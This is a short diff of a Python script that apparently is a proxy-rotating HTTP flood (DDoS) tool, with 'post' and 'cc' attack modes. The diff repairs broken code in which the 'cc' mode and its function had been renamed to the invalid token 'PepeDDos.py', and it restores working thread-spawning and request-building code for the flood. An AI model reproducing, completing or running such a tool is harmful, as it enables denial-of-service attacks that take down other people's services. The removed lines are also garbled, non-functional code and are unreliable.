@@ -74,7 +74,6 @@ referers = [
 ]
 
 
-mode = PepeDDos.py
 url = ""
 proxy_ver = "5"
 brute = False
@@ -94,7 +93,7 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th = threading.Thread(target = post,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
-	elif mode == PepeDDos.py:
+	elif mode == "cc":
 		for _ in range(thread_num):
 			th = threading.Thread(target = cc,args=(event,proxy_type,))
 			th.daemon = True
@@ -219,7 +218,7 @@ def InputOption(question,options,default):
 			continue
 	return ans
 
-def PepeDDos.py(event,proxy_type):
+def cc(event,proxy_type):
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
